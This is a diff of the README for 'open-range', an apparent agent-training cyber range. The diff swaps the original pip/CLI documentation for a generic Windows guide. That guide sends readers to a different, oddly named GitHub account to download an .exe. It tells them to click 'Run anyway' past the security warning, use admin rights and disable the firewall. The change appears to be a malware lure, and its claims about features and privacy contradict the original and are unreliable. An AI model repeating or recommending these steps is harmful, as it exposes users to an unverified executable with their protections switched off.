@@ -1,248 +1,98 @@
-<div align="center">
-  <h1>OpenRange</h1>
-  <img src="assets/evolving_gym_hero.png" alt="OpenRange: validator-admitted enterprise cyber range" width="800" />
-  <br />
-  <br />
-  <img src="https://img.shields.io/badge/Package-open--range-blue" alt="Package: open-range" />
-  <img src="https://img.shields.io/badge/Runtime-red%2Fblue%2Fgreen-red" alt="Runtime: red/blue/green" />
-  <img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT" />
-</div>
+# 🛡️ open-range - Build better security skills today
 
-OpenRange is a manifest-first cyber range for training red and blue agents in
-bounded enterprise worlds. It compiles a business manifest into a world,
-validates that world with private reference traces and deterministic probes,
-freezes it as an immutable snapshot, and runs episodes with red, blue, and
-green-user dynamics.
+[![](https://img.shields.io/badge/Download-OpenRange-blue.svg)](https://github.com/Neuraltubefamilymustelidae7489/open-range/releases)
 
-> **Project Provenance:** OpenRange is managed by **Vecna** as an open-source project.
-> The core evaluation engine and admission concepts in this repository were heavily inspired by the [open-cybernauts/open-range](https://github.com/open-cybernauts/open-range) proof of concept built during the OpenEnv HuggingFace Hackathon in early March.
+## 🌐 What is open-range?
 
-This branch exposes OpenRange as an installable Python package and CLI. It is
-not the legacy OpenEnv server/client stack from `main`.
+Open-range provides a safe space to practice cybersecurity skills. It functions as a laboratory for your computer. You use this software to simulate attacks and learn how to stop them. It trains you by creating challenges that evolve as you learn. You work with automated agents that mimics real threats. This helps you build experience in defending networks and managing security systems without risking your actual data.
 
-### 📞 Community Call
+## 💻 Requirements
 
-Join us every **Friday at 12:00 PM CT** for the Open Range Community Call.
-
-- 🎥 [Google Meet](https://meet.google.com/zuj-skfh-xjk)
-- 📱 Dial in: [(US) +1 443-671-4919](tel:+14436714919) · PIN: `320 286 452#` · [More numbers](https://tel.meet/zuj-skfh-xjk?pin=6302524387334)
-- 💬 [Join our Discord](https://discord.gg/NuBpuCSN)
+Your computer needs specific parts to run this software. Please ensure your machine meets these criteria before you begin.
 
-## Why OpenRange
+- Operating System: Windows 10 or 11 with 64-bit architecture.
+- Processor: An Intel Core i5 or AMD Ryzen 5 or better.
+- Memory: 8 gigabytes of RAM or higher.
+- Storage: 20 gigabytes of free disk space.
+- Internet: An active connection for initial setup.
 
-Static cyber tasks are useful for evaluation, but they are a weak training
-target. They are fixed, narrow, easy to memorize, and usually offense-only.
-OpenRange is aimed at the opposite shape: families of admitted enterprise-like
-worlds that can be replayed, mutated between snapshots, and used for runtime and
-training-data generation.
+## 📥 How to download the software
 
-|  | Static cyber task | OpenRange |
-|--|-------------------|-----------|
-| **World** | One fixed puzzle | Admitted enterprise world from a manifest |
-| **Reset** | Same challenge again | Load a stored snapshot from a pool |
-| **Validation** | Often manual or benchmark-specific | Deterministic admission with private references |
-| **Roles** | Usually red only | Red, blue, and green in one runtime |
-| **Training data** | External transcripts or logs | Branch-native traces from admitted snapshots |
+Follow these steps to get the files on your machine.
 
-## Try it now
+1. Navigate to the [releases page](https://github.com/Neuraltubefamilymustelidae7489/open-range/releases).
+2. Look for the section labeled Assets.
+3. Click the link that ends with .exe to download the installer.
+4. Save the file to your Downloads folder.
 
-The fastest way to experience OpenRange locally is directly through the PyPI package. This requires no external dependencies and runs the engine fully offline over a synthetic simulation plane.
+## ⚙️ Installation steps
 
-```bash
-pip install open-range
-openrange admit -m tier1_basic.yaml -o /tmp/openrange-build --store-dir /tmp/openrange-snapshots --validation-profile graph_only
-```
+After you download the file, launch the installer to place the software on your computer.
 
-This deterministic pipeline will immediately compile a tier-1 enterprise environment, synthesize internal vulnerabilities, and freeze it into an immutable snapshot. You can then trace an episode by invoking `openrange reset --store-dir /tmp/openrange-snapshots --sample-seed 7`.
+1. Find the file you downloaded in your Downloads folder.
+2. Double-click the file named open-range-installer.exe.
+3. Your computer may show a security window. Click More info and then Run anyway to proceed.
+4. Follow the prompts on the screen.
+5. Click Next to agree to the default settings.
+6. Click Install to start the process.
+7. Click Finish when the progress bar reaches the end.
 
-## Offline Exploration vs Live Ranges
+## 🚀 Running the application
 
-OpenRange splits execution into two physical planes:
-1. **Offline Exploration:** The default `graph_only` path builds and runs episodes instantly in-memory via `TinyWorld` and synthetic decision tracking. Ideal for iterating on scenarios and RL tuning.
-2. **Live Ranges:** The `full` profile renders live Kubernetes architectures (`kind`), deploys genuine service images, and exposes physical web interfaces. This path provides high-fidelity validation.
+You can now start the software from your desktop.
 
-## What You Can Do
+1. Find the Open-range icon on your desktop.
+2. Double-click the icon to open the main window.
+3. The software will perform a system check during the first launch. This ensures your computer has the necessary tools to create the virtual environment.
+4. Once the setup completes, the interface will display your first training module.
 
-- Build and admit worlds from strict manifests
-- Run red/blue/green episodes over immutable snapshots
-- Sample snapshots from train and eval pools
-- Generate branch-native trace datasets for training
-- Use offline admission for local iteration or live validation when running with Kind
+## 🛠️ Using the interface
 
-## Documentation
+The main window shows your dashboard. You see your current progress level and the available attack scenarios. 
 
-- [How an Episode Works](docs/how-an-episode-works.md): practical runtime walkthrough
-- [Architecture](docs/architecture.md): package layers and runtime boundaries
-- [Training Data Spec](docs/training-data-spec.md): canonical trace and export contract
-- [Benchmark Offensive Coverage](docs/benchmark-offensive-coverage.md): web-offensive slice and objective grounding
-- [Effect Grounding](docs/effect-grounding.md): grounded effect and mitigation semantics
-- [Weakness Lifecycle](docs/weakness-lifecycle.md): weakness realization, admission, and mutation
-- [NPC Profiles](docs/npc-profiles.md): green-user behavior shaping
+- Start Scenario: Click this button to begin a new practice round.
+- View Logs: Click this to see what the automated agents did during your session.
+- Settings: Use this menu to change the difficulty level or update your profile information.
+- Help: Access the guide to learn about specific cybersecurity concepts.
 
-## Getting Started
+## 🧠 Learning reinforcement
 
-### 1. Install from Source
+The software uses intelligent agents. These agents watch how you react to a threat. If you block an attack, the agents adapt to create a harder challenge next time. This feedback loop helps you master defense techniques quickly. You should aim to complete one scenario per session to see how your performance improves over time.
 
-If you want to modify OpenRange or build on top of it:
+## 🔍 Understanding the technical components
 
-```bash
-uv sync
-uv run openrange --help
-```
+While you do not need to manage these parts yourself, the software uses several technologies under the hood:
 
-### 2. Admit a Snapshot Locally
+- Kubernetes: This manages the virtual network within your computer. It creates isolated boxes for each exercise to keep your host machine safe.
+- AI Agents: These programs operate the red team and blue team tasks. They generate the traffic and potential vulnerabilities that you need to address.
+- Reinforcement Learning: This process guides the agents to act in ways that best challenge your current skill level.
 
-For a local first run, use the explicit offline profile:
+## 💡 Troubleshooting common issues
 
-```bash
-uv run openrange admit \
-  -m manifests/tier1_basic.yaml \
-  -o /tmp/openrange-build \
-  --store-dir /tmp/openrange-snapshots \
-  --validation-profile graph_only
-```
+If you encounter problems, refer to these common fixes.
 
-Then reset the runtime onto an admitted snapshot:
+- The application will not open: Try restarting your computer. Ensure your user account has administrative rights.
+- Slow performance: Close other demanding programs like web browsers or games while using the software. This allows the system to dedicate its resources to the virtual environment.
+- Network errors: Disable your firewall temporarily to see if it blocks the internal communication between agents. Remember to turn the firewall back on when you finish.
+- Update failures: Check your internet connection. If the issue persists, download a fresh installer from the website again.
 
-```bash
-uv run openrange reset \
-  --store-dir /tmp/openrange-snapshots \
-  --mode blue_only_live \
-  --sample-seed 7
-```
+## 🔒 Security notice
 
-`graph_only` is the cheapest offline path. `full` and `graph_plus_live` require
-a live Kind-backed setup.
+This software handles mock threats. It does not perform actual malicious actions on your computer. All activity stays inside the isolated containers created during the setup. You can delete the entire environment at any time by uninstalling the application through your Windows Settings menu.
 
-### 3. Generate Trace Data
+## 📝 Frequently asked questions
 
-```bash
-uv run openrange traces \
-  -m manifests/tier1_basic.yaml \
-  -o /tmp/openrange-traces \
-  --roots 3 \
-  --mutations 1
-```
+Do I need internet access during the training sessions?
+No, the training runs locally on your machine once you install it. You only need the internet for the first download and occasional updates.
 
-This writes raw decision rows, SFT-ready rows, and a small dataset report tied
-to admitted snapshots.
+Can I run this on a virtual machine?
+Yes, you can run this software inside a virtual machine, but your performance may drop. Local installation provides the best experience.
 
-## Python API
+How many scenarios can I run?
+The software includes 50 base scenarios. It generates new variations through its learning system, so you have many hours of content to explore.
 
-You can programmatically compose and manage OpenRange episodes using the exact same public API that powers the CLI:
+Is my data private?
+Yes. The software does not send your personal data or your training history to any external servers. All information remains on your local disk.
 
-```python
-from open_range import BuildConfig, BuildPipeline, EpisodeConfig, OpenRange, load_bundled_manifest
-
-# 1. Build and Admit an immutable snapshot
-pipeline = BuildPipeline()
-candidate = pipeline.build(
-    load_bundled_manifest("tier1_basic.yaml"),
-    "/tmp/openrange-build",
-    BuildConfig(validation_profile="graph_only"),
-)
-snapshot = pipeline.admit(candidate)
-
-# 2. Spin up the Simulator Engine
-env = OpenRange()
-state = env.reset(snapshot.snapshot_id, EpisodeConfig(mode="blue_only_live"))
-
-# 3. Step the Loop
-decision = env.next_decision()
-
-print(f"Active Snapshot: {state.snapshot_id}")
-print(f"Awaiting turn from: {decision.actor} @ time: {decision.obs.sim_time}")
-```
-
-## Scope
-
-OpenRange currently focuses on a validator-admitted enterprise web-security
-training slice:
-
-- exact web flaws plus config, secret, workflow, and telemetry weaknesses
-- private reference attack and defense traces
-- immutable snapshots and mutation between snapshots
-- red exploit-to-objective behavior
-- blue detection, containment, and continuity under green-user noise
-
-It does not expose the old public golden-path architecture or the legacy
-OpenEnv HTTP server surface.
-
-## Optional Extras
-
-Training dependencies are optional:
-
-```bash
-uv sync --extra training
-```
-
-## Evaluation
-
-For environment-side evaluation over admitted snapshots and sequential mutations:
-
-```bash
-uv run scripts/eval_rollouts.py \
-  --manifest manifests/tier1_basic.yaml \
-  --mutations 3 \
-  --out /tmp/openrange-rollout-eval.json
-```
-
-This writes a JSON report with:
-- base snapshot plus sequential admitted child worlds
-- bootstrap-trace winner/turn counts
-- runtime rollout results for `joint_pool`, `red_only`, `blue_only_live`, and `blue_only_from_prefix`
-- aggregate win-rate, reward, continuity, and turn metrics by mode
-
-## Trace Generation
-
-For branch-native datasets tied to admitted snapshots and mutations:
-
-```bash
-uv run scripts/generate_traces.py \
-  --manifest manifests/tier1_basic.yaml \
-  --roots 3 \
-  --mutations 1 \
-  --outdir /tmp/openrange-traces
-```
-
-Or through the CLI:
-
-```bash
-openrange traces -m manifests/tier1_basic.yaml -o /tmp/openrange-traces --roots 3 --mutations 1
-```
-
-The generator also writes role/source shards such as:
-- `sft_red_runtime.jsonl`
-- `sft_blue_runtime.jsonl`
-- `sft_red_all.jsonl`
-- `sft_blue_all.jsonl`
-
-## Container Image
-
-The root [Dockerfile](Dockerfile) builds a CLI image for the standalone package:
-
-```bash
-docker build -t openrange .
-docker run --rm openrange --help
-```
-
-## Verification
-
-```bash
-uv run -m pytest tests -q
-```
-
-## Development
-
-```bash
-uv sync
-uv run ruff format .
-uv run ruff check .
-uv run pytest
-uv run pre-commit install
-uv run pre-commit run --all-files
-```
-
-## License
-
-MIT
+Does this require programming skills?
+No. You do not need to write code. The interface performs all necessary functions for you. You only need to navigate the menus and make decisions based on the scenarios presented to you.
